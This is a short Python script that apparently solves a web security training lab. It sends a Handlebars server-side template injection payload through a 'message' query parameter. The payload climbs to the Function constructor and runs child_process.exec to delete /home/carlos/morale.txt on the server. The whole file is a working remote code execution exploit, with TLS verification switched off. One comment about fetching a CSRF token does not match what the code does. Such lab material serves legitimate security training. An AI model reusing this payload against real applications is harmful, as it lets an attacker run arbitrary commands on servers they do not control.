#!/usr/bin/env python3
import requests
import argparse
from urllib.parse import urljoin

MESSAGE_PATH = "/"
DELETE_FILENAME = "/home/carlos/morale.txt"

def send_message_with_payload(base_url, payload):
    """Send a GET request with a payload to display the message."""
    message_url = urljoin(base_url, MESSAGE_PATH)

    # Do not concatenate the payload manually to avoid encoding issues
    # Use params instead
    r = requests.get(message_url, params={"message": payload}, timeout=10, verify=False)
    r.raise_for_status()
    return r

def main():
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(
        description="Lab: Server-side template injection in an unknown language with a documented exploit"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")

    print(f"[*] Base URL: {base_url}")

    # Step 1: Get CSRF token from /feedback page
    print("[*] Performing attack. Sending GET request with /message=payload...\n")
    payload = f'''
        {{{{#with "s" as |string|}}}}
          {{{{#with "e"}}}}
            {{{{#with split as |conslist|}}}}
              {{{{this.pop}}}}
              {{{{this.push (lookup string.sub "constructor")}}}}
              {{{{this.pop}}}}
              {{{{#with string.split as |codelist|}}}}
                {{{{this.pop}}}}
                {{{{this.push "return require('child_process').exec('rm {DELETE_FILENAME}');"}}}}
                {{{{this.pop}}}}
                {{{{#each conslist}}}}
                  {{{{#with (string.sub.apply 0 codelist)}}}}
                    {{{{this}}}}
                  {{{{/with}}}}
                {{{{/each}}}}
              {{{{/with}}}}
            {{{{/with}}}}
          {{{{/with}}}}
        {{{{/with}}}}
        '''
    send_message_with_payload(base_url, payload)
    # if no exceptions - Lab solved
    print(f"[*] File {DELETE_FILENAME} removed\n")

    print("\n[+] Attack finished. See Lab solved.")


if __name__ == "__main__":
    main()